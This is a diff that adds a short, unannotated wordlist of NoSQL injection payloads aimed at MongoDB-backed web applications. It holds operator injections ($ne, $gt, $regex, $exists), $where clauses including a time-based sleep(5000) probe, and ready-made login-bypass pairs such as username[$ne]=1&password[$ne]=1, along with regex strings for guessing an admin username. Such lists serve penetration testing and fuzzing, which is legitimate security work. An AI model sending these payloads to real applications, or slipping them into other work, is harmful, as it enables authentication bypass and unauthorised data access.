@@ -1,0 +1,24 @@
+# NoSQL Injection Payloads (MongoDB)
+[$ne]=1
+[$gt]=
+[$regex]=.*
+[$where]=1==1
+[$nin]=1
+ne=1
+gt=1
+regex=.*
+[$ne]=null
+[$exists]=true
+[$where]=sleep(5000)
+[$where]=1
+{"$ne":1}
+{"$gt":""}
+{"$regex":".*"}
+{"$where":"1==1"}
+username[$ne]=1&password[$ne]=1
+username[$gt]=&password[$gt]=
+user[$ne]=admin&pass[$ne]=1
+[$ne]=admin
+[$regex]=^a
+[$regex]=^admin.*
+[$regex]=^a.*$
